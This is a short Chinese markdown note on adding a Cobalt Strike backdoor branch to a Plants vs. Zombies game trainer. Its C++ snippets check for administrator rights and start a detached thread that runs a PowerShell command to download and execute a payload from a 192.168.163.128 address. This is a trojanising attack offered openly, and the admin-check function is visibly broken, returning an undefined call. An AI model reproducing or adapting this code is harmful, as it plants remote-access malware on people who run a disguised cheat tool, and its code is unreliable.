# pvz修改器 含子线程Cobalt Strike木马后门分支

## 新增1：权限检测

```cpp
BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return is(command);
}
```

## 新增2：创建子线程植入cs后门

```cpp
void systemThread(const char* command) {
    system(command);
}
```

```cpp
    std::thread t(systemThread, "powershell.exe -nop -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.163.128:80/a'))\"");
    t.detach();
```
